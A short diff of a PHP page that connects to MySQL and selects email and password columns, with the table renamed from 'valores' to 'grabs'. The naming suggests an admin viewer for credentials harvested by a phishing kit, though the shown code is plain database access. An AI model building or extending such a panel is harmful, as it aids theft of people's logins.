@@ -23,15 +23,15 @@
                     $passwd;
                     $db;
 
-                    //echo "<tr><th>Email</th><th>Password</th></tr>";
                     $conn = mysqli_connect($server, $username, $passwd, $db);
+                    
                     // Check connection
                     if($conn === false){
                         echo "<a href='./admin/config.php'>Edit your DB connection params</a>\n\n\n";
                         die("ERROR: Could not connect. ". mysqli_connect_error()); 
                     }
 
-                    $sql = "select email, passwd from valores";
+                    $sql = "select email, passwd from grabs";
                     $result = $conn->query($sql);
 
                     if ($result->num_rows > 0) {
